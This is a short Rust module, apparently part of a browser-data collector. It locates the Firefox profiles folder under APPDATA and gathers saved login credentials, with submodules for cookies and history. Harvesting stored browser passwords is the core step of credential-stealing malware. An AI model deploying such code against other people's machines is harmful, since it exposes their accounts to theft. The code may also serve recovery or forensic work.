pub mod cookies;
pub mod history;
pub mod passwords;

use std::{env, path::Path};

use crate::browser::Login;
use passwords::get_creds_fox;

pub fn get_creds_moz() -> Option<Vec<Login>> {
    let mut creds: Vec<Login> = Vec::new();
    if let Some(mut cred) = get_creds_fox(Path::new(&format!("{}\\Mozilla\\Firefox\\Profiles", env::var("APPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if creds.is_empty() {return None;}
    Some(creds) 
}